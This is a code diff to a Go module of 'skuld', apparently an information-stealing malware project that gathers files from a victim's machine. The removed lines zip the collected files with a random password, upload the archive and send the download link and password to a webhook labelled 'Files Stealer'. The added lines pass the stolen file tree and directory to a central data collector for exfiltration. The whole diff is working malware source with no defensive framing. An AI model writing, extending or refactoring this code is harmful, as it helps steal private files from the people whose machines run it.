@@ -10,10 +10,10 @@ import (
 
 	"github.com/hackirby/skuld/utils/fileutil"
 	"github.com/hackirby/skuld/utils/hardware"
-	"github.com/hackirby/skuld/utils/requests"
+	"github.com/hackirby/skuld/utils/collector"
 )
 
-func Run(webhook string) {
+func Run(dataCollector *collector.DataCollector) {
 	tempDir := filepath.Join(os.TempDir(), "commonfiles-temp")
 	os.MkdirAll(tempDir, os.ModePerm)
 	defer os.RemoveAll(tempDir)
@@ -135,41 +135,13 @@ func Run(webhook string) {
 		return
 	}
 
-	tempZip := filepath.Join(os.TempDir(), "commonfiles.zip")
-	password := randString(16)
-	fileutil.ZipWithPassword(tempDir, tempZip, password)
-	defer os.Remove(tempZip)
-
-	link, err := requests.Upload(tempZip)
-	if err != nil {
-		return
+	// Add common files data to collector
+	filesInfo := map[string]interface{}{
+		"FilesFound": found,
+		"TreeView":   fileutil.Tree(tempDir, ""),
 	}
-
-	requests.Webhook(webhook, map[string]interface{}{
-		"embeds": []map[string]interface{}{
-			{
-				"title":       "Files Stealer",
-				"description": "```" + fileutil.Tree(tempDir, "") + "```",
-				"fields": []map[string]interface{}{
-					{
-						"name":   "Archive Link",
-						"value":  "[Download here](" + link + ")",
-						"inline": true,
-					},
-					{
-						"name":   "Archive Password",
-						"value":  "`" + password + "`",
-						"inline": true,
-					},
-					{
-						"name":   "Files Found",
-						"value":  fmt.Sprintf("`%d`", found),
-						"inline": true,
-					},
-				},
-			},
-		},
-	})
+	dataCollector.AddData("commonfiles", filesInfo)
+	dataCollector.AddDirectory("commonfiles", tempDir, "common_files")
 }
 
 func randString(n int) string {
